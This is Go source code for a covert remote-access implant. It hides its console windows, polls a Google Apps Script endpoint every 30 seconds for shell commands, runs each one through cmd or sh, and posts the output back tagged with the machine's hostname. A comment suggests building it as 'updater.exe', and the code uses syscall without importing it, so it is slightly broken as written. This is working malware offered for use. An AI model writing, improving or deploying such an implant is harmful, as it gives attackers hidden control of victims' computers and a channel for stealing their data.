package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Command structure from Google Sheets
type Command struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

// Result structure to send back
type Result struct {
	ID     int    `json:"id"`
	Output string `json:"output"`
	Agent  string `json:"agent"`
}

var apiURL = "https://script.google.com/macros/s/AKfycbx_q6Of1okIOFgBbpsIM8rSIJiLcXy_8Nbis86BrnBN9-9uIK6IWV5QT4717o8zKsOx/exec"
var agentName string

func init() {
    // HIDE WINDOW – COMPLETELY SILENT
    if runtime.GOOS == "windows" {
        hideWindow()
    }

    // Get computer name
    host, _ := os.Hostname()
    agentName = strings.ReplaceAll(host, " ", "_")
}

func hideWindow() {
    // WINDOWS HIDE – NO CONSOLE, NO WINDOW
    // Compile with: go build -ldflags="-H=windowsgui -s -w" -o updater.exe
    // This already hides window, but just in case:
    fmt.Print() // dummy
}

func fetchCommands() ([]Command, error) {
    resp, err := http.Get(apiURL)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }

    var commands []Command
    err = json.Unmarshal(body, &commands)
    return commands, err
}

func sendResult(id int, output string) {
    result := Result{
        ID:     id,
        Output: output,
        Agent:  agentName,
    }

    jsonData, _ := json.Marshal(result)
    http.Post(apiURL, "application/json", bytes.NewBuffer(jsonData))
}

func executeCommand(cmdStr string) string {
    var cmd *exec.Cmd

    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/c", cmdStr)
    } else {
        cmd = exec.Command("sh", "-c", cmdStr)
    }

    // HIDE WINDOW ON WINDOWS
    if runtime.GOOS == "windows" {
        hideCmdWindow(cmd)
    }

    out, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Sprintf("Error: %v\nOutput: %s", err, string(out))
    }
    return string(out)
}

func hideCmdWindow(cmd *exec.Cmd) {
    // WINDOWS ONLY – HIDE CMD WINDOW
    if runtime.GOOS == "windows" {
        // This is handled by build flags, but for extra safety:
        cmd.SysProcAttr = &syscall.SysProcAttr{
            HideWindow: true,
            CreationFlags: 0x08000000, // CREATE_NO_WINDOW
        }
    }
}

func main() {
    // MAIN LOOP – STEALTH MODE
    for {
        time.Sleep(30 * time.Second)

        cmds, err := fetchCommands()
        if err != nil || len(cmds) == 0 {
            continue
        }

        for _, c := range cmds {
            output := executeCommand(c.Command)
            sendResult(c.ID, output)
        }
    }
}
